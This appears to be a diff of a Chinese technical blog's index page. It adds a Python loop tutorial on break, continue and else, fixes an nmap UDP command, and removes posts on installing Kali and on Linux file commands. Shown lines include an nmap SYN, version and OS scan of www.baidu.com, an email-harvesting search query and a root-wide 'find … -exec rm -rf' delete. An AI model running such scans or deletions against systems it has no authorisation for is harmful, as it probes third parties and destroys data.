+    print(&quot;循环进行中：&quot; + s[idx])
+    idx += 1
+else:
+    s = &quot;循环正常结束&quot;
+print(s)</code></pre>
+<p>执行结果：</p>
+<pre><code class="python">循环进行中：B
+循环进行中：I
+循环进行中：T
+循环正常结束
+&gt;&gt;&gt; </code></pre>
+<p>（3）若要通过while实现一个计数循环，则需在循环之前对计数器idx进行初始化，并在每次循环中对计数器idx进行累加。而for循环中循环变量逐一取自遍历结构，不需要程序维护计数器。</p>
+<h3 id="循环保留字：break和continue"><a href="#循环保留字：break和continue" class="headerlink" title="循环保留字：break和continue"></a>循环保留字：break和continue</h3><p>（1）这两个保留字用来辅助控制循环执行。</p>
+<p>（2）break用来跳出最内层for或while循环，脱离该循环后程序从循环代码后继续执行，例如：</p>
+<pre><code class="python">for s in &quot;BIT&quot;:
+    for i in range(10):
+        print(s, end=&quot;&quot;)
+        if s==&quot;I&quot;:
+            break</code></pre>
+<p>执行结果：</p>
+<pre><code class="python">BBBBBBBBBBITTTTTTTTTT
+&gt;&gt;&gt;</code></pre>
+<p>其中，break语句跳出了最内层for循环，单仍然继续执行外层循环，每个break语句只能跳出当前层次循环。</p>
+<p>（3）continue用来结束当前当次循环，即跳过循环体中下面还没执行的语句，但不跳出循环。</p>
+<pre><code class="python">for s in &quot;Python&quot;:
+    if s == &quot;t&quot;:
+        continue
+    print(s, end=&quot;&quot;)</code></pre>
+<p>执行结果：</p>
+<pre><code class="python">Pyhon
+&gt;&gt;&gt; </code></pre>
+<p>（4）for循环和while循环中都存在else扩展用法，else语句只在一种情况下执行，即循环正常遍历了所有内容或由于条件不成立而结束循环，没有因为break或return而退出循环。若有break或return则不执行else，continue保留字对else没有影响。</p>
+<pre><code class="python">#continue
+for s in &quot;Python&quot;:
+    if s == &quot;t&quot;:
+        continue
+    print(s, end=&quot;&quot;)
+else:
+    print(&quot;正常退出&quot;)</code></pre>
+<p>执行结果：</p>
+<pre><code>Pyhon 正常退出
+&gt;&gt;&gt; </code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python/深入Python语言(二)-基本数据类型02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -854,12 +1430,12 @@ intext:&quot;@163.com&quot;         //邮箱搜集</code></pre>
 nmap -sS -sV -O -F www.baidu.com</code></pre>
 <p><img src="https://i.loli.net/2020/11/28/mVWkoXBKMt9vAY8.png" alt="image-20201128225426693"></p>
 <pre><code>#使用UDP探测scanme.nmap.org的DNS(53),SNMP(161),NTP(123)服务
-nmap -sU -P 53 161 123 scanme.nmap.org
+nmap -sU -p 53,161,123 scanme.nmap.org
 
 #open   开放
 #close  关闭
 #filtered 被过滤</code></pre>
-<p><img src="https://i.loli.net/2020/11/28/OKws1gfZmyP6elx.png" alt="image-20201128230000223"></p>
+<p><img src="https://i.loli.net/2021/01/31/SoxlKWvh6ftqMXy.png" alt="image-20210131150814806"></p>
 <pre><code>#获取IP地址段10.10.10.0/24所有在线主机
 nmap -sP 10.10.10.0/24</code></pre>
 <p><img src="https://i.loli.net/2020/11/28/euU1NCdqnDxoZ4b.png" alt="image-20201128230406623"></p>
@@ -2558,293 +3134,9 @@ init 6</code></pre>
 
 
   
-    <article id="post-kali/kali2020.1安装过程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/">kali2020.1安装过程</a>
-    </h1>
-  
-
-        
-        <a href="/2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/" class="archive-article-date">
-  	<time datetime="2020-11-18T11:39:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="准备资源"><a href="#准备资源" class="headerlink" title="准备资源"></a>准备资源</h2><p>（1）kali2020.1镜像，下载链接:<a target="_blank" rel="noopener" href="https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso">https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso</a></p>
-<p>（2）VMware</p>
-<p>（3）良好的网络环境</p>
-<p>（4）物理计算机至少有8G的内存，以保证在后续使用虚拟机时的流畅</p>
-<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="新建一个虚拟机"><a href="#新建一个虚拟机" class="headerlink" title="新建一个虚拟机"></a>新建一个虚拟机</h3><p>（1）打开VMware，新建一个虚拟机</p>
-<p><img src="https://i.loli.net/2020/11/18/5XWaNzcn7CAwHh9.png" alt="image-20201118194822750"></p>
-<p>（2）会弹出两种安装方式，这里我选择自定义安装</p>
-<p><img src="https://i.loli.net/2020/11/18/TSrnQKmefyx51MA.png" alt="image-20201118194943515"></p>
-<p>（3）默认选择下一步，直到“安装客户机操作系统”，这里选择“稍后安装操作系统”</p>
-<p><img src="https://i.loli.net/2020/11/18/4ipg25EmeGxB3wO.png" alt="image-20201118195206604"></p>
-<p>（4）选择操作系统及其版本</p>
-<p><img src="https://i.loli.net/2020/11/18/ShvCRwpOme84uQA.png" alt="image-20201118195449341"></p>
-<p>（5）给虚拟机命名，并给其选择存放位置，这里建议在VMware目录下新建一个与虚拟机名称一样的文件夹，将虚拟机存在这个文件夹里。</p>
-<p><img src="https://i.loli.net/2020/11/18/sFnwLfxpku4M2zt.png" alt="image-20201118195753952"></p>
-<p>（6）配置处理器数量</p>
-<p><img src="https://i.loli.net/2020/11/20/3sUfFGozpgAjuZC.png" alt="image-20201119125125453"></p>
-<p>（7）为虚拟机分配内存，这里可以分配多一点，以便在后续的安装中更快</p>
-<p><img src="https://i.loli.net/2020/11/18/Q8PkLYq3iTphnxO.png" alt="image-20201118200631782"></p>
-<p>（8）网络类型选择NAT模式，桥接模式需要一个真实的IP，在校园里一般都是NAT模式。</p>
-<p>（9）之后便一直默认下一步，直到为虚拟机分配磁盘容量，这里可自行定义</p>
-<p><img src="https://i.loli.net/2020/11/18/XsACzh1xDS8IPla.png" alt="image-20201118200852936"></p>
-<p>（10）默认下一步，直到“自定义硬件”，这里可以移除一些平时不用的硬件配置，比如USB控制器、声卡、打印机。点击“自定义硬件”即可在里面移除不用的硬件，然后点击完成。</p>
-<p><img src="https://i.loli.net/2020/11/18/moWHl74GbhLCOsP.png" alt="image-20201118221327164"></p>
-<p>（11）可看到已经创建好了一个虚拟机，此时便要用到下载好的镜像了。点击“CD/DVD(IDE)”,选择“使用ISO映像文件”，添加下载好的镜像，点击确定。</p>
-<p><img src="https://i.loli.net/2020/11/18/LC2yNAH1boZ47pU.png" alt="image-20201118202005823"></p>
-<p><img src="https://i.loli.net/2020/11/18/IDyEQuATq85SnWj.png" alt="image-20201118202118646"></p>
-<h3 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h3><p>（1）点击开启虚拟机</p>
-<p><img src="https://i.loli.net/2020/11/18/ASMQzZ1RUPepvkX.png" alt="image-20201118202451736"></p>
-<p>（2）再出现的页面里选择Graphical install，回车，进行GUI界面安装</p>
-<p><img src="https://i.loli.net/2020/11/18/NZmAzXrL3S2HdBe.png" alt="image-20201118202651265"></p>
-<p>（3）选择一种语言，这里我选择English，选好后点击continue</p>
-<p><img src="https://i.loli.net/2020/11/18/QpMaZgdkzuIHoXS.png" alt="image-20201118202755157"></p>
-<p>（4）选择国家、领地或地区</p>
-<p><img src="https://i.loli.net/2020/11/20/lbFrZzvmwgCDYnW.png" alt="image-20201120124026274"></p>
-<p>（5）选择键盘映射</p>
-<p><img src="https://i.loli.net/2020/11/20/2avsNCjpUz4xcBV.png" alt="image-20201120124328490"></p>
-<p>（6）稍等1分钟。填写主机名</p>
-<p><img src="https://i.loli.net/2020/11/18/S8ypjUHImC7Lgds.png" alt="image-20201118203301686"></p>
-<p>（7）填写域名，这里可不填</p>
-<p><img src="https://i.loli.net/2020/11/18/fTXeW3Q9rFk8UaR.png" alt="image-20201118203351174"></p>
-<p>（8）设置一个用户名来取代root执行非管理任务的普通用户账号，因为2020版本的kali系统打破了传统默认是root的默认账号。</p>
-<p><img src="https://i.loli.net/2020/11/18/wX2eKgRrWLMvyup.png" alt="image-20201118203930694"></p>
-<p>（9）这里会填入上一步的用户名，可改可不改，这里是在登录界面用的用户名。</p>
-<p><img src="https://i.loli.net/2020/11/18/G4vhds7uL6WtT2F.png" alt="image-20201118204113340"></p>
-<p>（10）输入密码，二次输入确认密码</p>
-<p><img src="https://i.loli.net/2020/11/18/sXLcI6UMtRElZAr.png" alt="image-20201118204212719"></p>
-<p>（11）稍等1到两分钟，选择时区</p>
-<p><img src="https://i.loli.net/2020/11/18/B8RTg3AunV29rSw.png" alt="image-20201118204421448"></p>
-<p>（12）进入磁盘分区选项，点击continue</p>
-<p><img src="https://i.loli.net/2020/11/18/x9GhY3UWQiA5kjH.png" alt="image-20201118204704353"></p>
-<p>（13）默认并一直点击continue，直到最后一项，选择“yes”，将改动写入磁盘</p>
-<p><img src="https://i.loli.net/2020/11/20/BLOSzmAFR7cdjpn.png" alt="image-20201120124504208"></p>
-<p>（14）稍等1分钟，进入配置软件包管理器。这里若没有http代理信息，可忽略，点击continue</p>
-<p><img src="https://i.loli.net/2020/11/20/Feq3szcvNxDMw2E.png" alt="image-20201120124628480"></p>
-<p><img src="https://i.loli.net/2020/11/18/yO9kegB2uZ6CYtX.png" alt="image-20201118205218688"></p>
-<p>（15）默认即可，continue</p>
-<p><img src="https://i.loli.net/2020/11/18/DhuOtkTaMrH27Sy.png" alt="image-20201118215722620"></p>
-<p>（16）之后便是“选择并安装软件”，这里需要一点时间，安装完成后，便是将GRUB安装至硬盘，选择“yes”</p>
-<p><img src="https://i.loli.net/2020/11/20/BgtskKXzbRdjPa2.png" alt="image-20201120122137530"></p>
-<p>（17）选择/dev/sda</p>
-<p><img src="https://i.loli.net/2020/11/20/rXnxbWyJYhfejLq.png" alt="image-20201120122345533"></p>
-<p>（18）安装完成</p>
-<p><img src="https://i.loli.net/2020/11/20/wj8yP64sCcK9ndh.png" alt="image-20201120122609322"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-kali/kali中的文件-目录操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/">kali中的文件/目录操作</a>
-    </h1>
-  
-
-        
-        <a href="/2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/" class="archive-article-date">
-  	<time datetime="2020-11-16T07:04:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="文件操作常见命令"><a href="#文件操作常见命令" class="headerlink" title="文件操作常见命令"></a>文件操作常见命令</h2><p>以下内容都是基于kali2020.1版本的，在此列出命令的一些常见使用参数及用法，若要获取详细的使用方法，在命令后面加上 –help即可查看，或者使用man也可查看命令的帮助文档</p>
-<pre><code>命令 --help
-man 命令</code></pre>
-<h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><pre><code>cd dir             //进入一个目录dir
-cd .               //验证&quot;.&quot;代表当前目录
-cd ..              //进入当前目录的上一级（cd ../.. 进入当前目录的上两级目录）
-cd -               //返回进入此目录之前所在的目录</code></pre>
-<p><img src="https://i.loli.net/2020/11/17/QOJ7eMRVEADYHPC.png" alt="image-20201117193550828"></p>
-<h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前所在的工作目录</p>
-<p><img src="https://i.loli.net/2020/11/17/ASpWwGgIdYsPHbq.png" alt="image-20201117193616793"></p>
-<h3 id="ls-参数-对象-显示目录中的文件"><a href="#ls-参数-对象-显示目录中的文件" class="headerlink" title="ls [参数] [对象]       显示目录中的文件"></a>ls [参数] [对象]       显示目录中的文件</h3><pre><code>-a               //显示所有文件（包含隐藏文件）
--l               //显示文件或目录的详细信息
--lh              //将文件大小以K为单位显示
--i               //显示文件或目录的indoes</code></pre>
-<p>这里直接使用’ll’命令，其效果和’ls -l’一样，但初次使用’ll’会报错，系统会提示未找到该命令。</p>
-<p>解决方法：</p>
-<p>（1）编辑以下文档</p>
-<pre><code>vim ~/.bashrc     //进入编辑模式</code></pre>
-<p>（2）将alias ll=’ls -l‘前面的注释符号#删掉，保存并退出编辑</p>
-<p>（3）重启即可</p>
-<p><img src="https://i.loli.net/2020/11/17/ewixY9GIWPm8qLX.png" alt="image-20201117200316254"></p>
-<h3 id="touch，vi-创建文件"><a href="#touch，vi-创建文件" class="headerlink" title="touch，vi     创建文件"></a>touch，vi     创建文件</h3><pre><code>touch file            //立即生成文件，若文件存在，则更新文件的时间戳
-vi file               //必须要保存才能生成相应的文件</code></pre>
-<h3 id="mkdir-dir-创建目录"><a href="#mkdir-dir-创建目录" class="headerlink" title="mkdir  dir    创建目录"></a>mkdir  dir    创建目录</h3><h3 id="rmdir-删除空目录"><a href="#rmdir-删除空目录" class="headerlink" title="rmdir            删除空目录"></a>rmdir            删除空目录</h3><pre><code>rmdir dir           //只能删除空目录</code></pre>
-<p>若要删除非空目录：</p>
-<pre><code>rm -rf dir</code></pre>
-<h3 id="cp-参数-sou-dst-复制文件或目录"><a href="#cp-参数-sou-dst-复制文件或目录" class="headerlink" title="cp [参数] sou dst     复制文件或目录"></a>cp [参数] sou dst     复制文件或目录</h3><pre><code>cp file1 file2 /dir          //若sou为文件，dst为目录，则可复制多个文件到该目录，但要加上目录所在路径
-cp file1 file2               //若sou和dst均为文件，则将file1的内容复制到file2中
-cp -r dir1 dir2              //若sou和dst均为目录，则将dir2复制到dir1中，需要加上参数-r  </code></pre>
-<h3 id="mv-sou-dst-重命名、移动文件"><a href="#mv-sou-dst-重命名、移动文件" class="headerlink" title="mv sou dst      重命名、移动文件"></a>mv sou dst      重命名、移动文件</h3><pre><code>mv file1 file2             //若sou和dst均为文件，则将file1重命名为file2
-mv file dir                //若sou为文件，dst为目录，则将file移动到目录dir中，且可以移动多个文件</code></pre>
-<h3 id="rm-参数-删除文件或目录"><a href="#rm-参数-删除文件或目录" class="headerlink" title="rm [参数]         删除文件或目录"></a>rm [参数]         删除文件或目录</h3><pre><code>-i                 //删除之前系统会进行一次确认
--r                 //递归删除，用于删除目录
--f                 //强制删除，没有提示和确认</code></pre>
-<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><pre><code>file file_name     //显示文件类型等基本信息</code></pre>
-<h3 id="ln-s-target-link-name-建立文件或目录链接"><a href="#ln-s-target-link-name-建立文件或目录链接" class="headerlink" title="ln [-s] target link_name         建立文件或目录链接"></a>ln [-s] target link_name         建立文件或目录链接</h3><p>（1）target最好指定为绝对路径，可使用pwd命令快速地获取路径，在后面加上需要链接的文件或目录即可</p>
-<p>（2）建立的链接相当于windows中的快捷方式，但和target文件有不同的inodes。</p>
-<p><img src="https://i.loli.net/2020/11/17/eIcms43GCbuO9YZ.png" alt="image-20201117210654615"></p>
-<p><img src="https://i.loli.net/2020/11/17/L7PSbIX1kYcOMEH.png" alt="image-20201117210722443"></p>
-<h3 id="find-path-expr-在路径path中查找符合表达式expr的文件"><a href="#find-path-expr-在路径path中查找符合表达式expr的文件" class="headerlink" title="find [path] [expr]              在路径path中查找符合表达式expr的文件"></a>find [path] [expr]              在路径path中查找符合表达式expr的文件</h3><p>（1）以下为表达式内容</p>
-<pre><code>-name flag         //查找文件名符合flag的文件，-iname忽略大小写
--empty             //查找空文件
--user root         //查找在系统中属于root这个用户的文件
--group root        //查找在系统中属于root这个组的文件
--amin -n           //查找系统中最后n分钟被访问的文件
--atime -n          //查找系统中最后n天被访问的文件</code></pre>
-<p>（2）查找相关文件，并执行相关命令</p>
-<pre><code>//将查找到的文件执行command操作
--exc command &#123;&#125; \;          
-| xargs command
-
-eg:
-//删除查找到的文件名符合flag的文件
-find / -name flag -exec rm -rf &#123;&#125; \;         
-find / -name flag | xargs rm -rf</code></pre>
-<p>{}表示find搜索出来的每个文件</p>
-<p>{}和\之间有空格，命令的结尾必须是”;“不要忘记最后的分号</p>
-<p>“|”为管道符，即把前一个命令的输出作为后一个命令的输入</p>
-<h2 id="压缩，解压缩命令"><a href="#压缩，解压缩命令" class="headerlink" title="压缩，解压缩命令"></a>压缩，解压缩命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><pre><code>tar cvf file.tar dir    //打包目录中的文件，后面也可跟多个文件
-tar xvf file.tar        //解包
-#tar是打包，不是压缩</code></pre>
-<h3 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h3><pre><code>gzip file           //压缩
-gunzip file.gz      //解压
-gzip -d file.gz     //解压</code></pre>
-<h3 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h3><pre><code>tar zcvf file.tar.gz dir //压缩
-tar zxvf file.tar.gz     //解压</code></pre>
-<h3 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h3><pre><code>bzip2 (-z) file      //压缩，有无参数z都可
-bunzip2 file.bz2     //解压
-bzip2 -d file.bz2    //解压</code></pre>
-<h3 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title=".tar.bz2"></a>.tar.bz2</h3><pre><code>tar jcvf file.tar.bz2 dir   //压缩
-tar jxvf file.tar.bz2       //解压</code></pre>
-<h3 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h3><pre><code>zip file.zip file/dir     //压缩文件或目录
-unzip file.zip            //解压</code></pre>
-<h3 id="tgz"><a href="#tgz" class="headerlink" title=".tgz"></a>.tgz</h3><pre><code>tar zcvf file.tar.tgz file1 file2   //压缩
-tar zxvf file.tar.tgz      //解压</code></pre>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
